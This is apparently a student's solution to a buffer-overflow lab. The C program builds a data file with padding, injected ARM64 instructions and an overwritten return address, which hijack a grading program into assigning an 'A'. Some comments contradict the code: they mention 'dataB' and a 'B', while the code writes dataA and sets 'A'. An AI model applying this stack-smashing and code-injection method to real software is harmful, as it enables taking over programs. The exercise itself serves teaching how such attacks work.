/*----------------------------------------------------------------------
 * createdataA.c
 * Author: Praneeth Bhandaru
 *
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction in
 * main to get a B, the latter of which will overwrite getName's stored
 * x30.
----------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

static const unsigned int lReturnAddress = 0x42006C;
static const char sName[] = "Chinmay Bhandaru";


/* Takes no parameters. Opens (and potentially creates) file 'dataA'.
 * Writes content to 'dataA' that results in a grade of 'A' being
 * assigned by executing code in the BSS. Returns 0 upon completion. */
int main(void) {
    int i;
    unsigned int uiInstr;

    /* Open/create file dataB with write privileges */
    FILE *psFile = fopen("dataA", "w");

    /* Print the stored name into dataB */
    fprintf(psFile, sName);

    /* Add nullbytes as padding and to mark end of the name*/
    for (i = 0; i < 4; i++) {
        putc(0, psFile);
    }

    /* mov x0, 'A' */
    uiInstr = MiniAssembler_mov(0, 'A');
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* adr x1, 0x420044 */
    uiInstr = MiniAssembler_adr(1, 0x420044,0x420070);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* strb x0, [x1] */
    uiInstr = MiniAssembler_strb(0, 1);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* b 0x40089c */
    uiInstr = MiniAssembler_b(0x40089c, 0x420078);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Add nullbytes to overrun the buffer */
    for (i = 0; i < 12; i++) {
        putc(0, psFile);
    }

    /* Overwrite x30 with address of printf call in main */
    (void) fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
